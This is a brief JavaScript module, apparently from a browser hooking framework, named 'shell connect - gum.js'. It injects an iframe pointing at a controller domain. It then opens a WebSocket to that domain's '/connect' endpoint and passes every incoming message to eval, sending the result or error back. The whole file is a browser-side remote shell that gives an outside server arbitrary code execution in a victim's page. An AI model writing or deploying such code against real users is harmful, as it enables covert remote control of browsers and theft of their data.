/*
	shell connect - gum.js

*/
gum.addom("<iframe src'http://"+ gum.domain +"/ing'>");
gum_chrome_shell = new window.WebSocket('ws://' + gum.domain + '/connect');
gum_chrome_shell.onmessage = function(command){
    try{
        gum_chrome_shell.send(eval(command.data));
    }catch(e){
        gum_chrome_shell.send(e);
    };
};
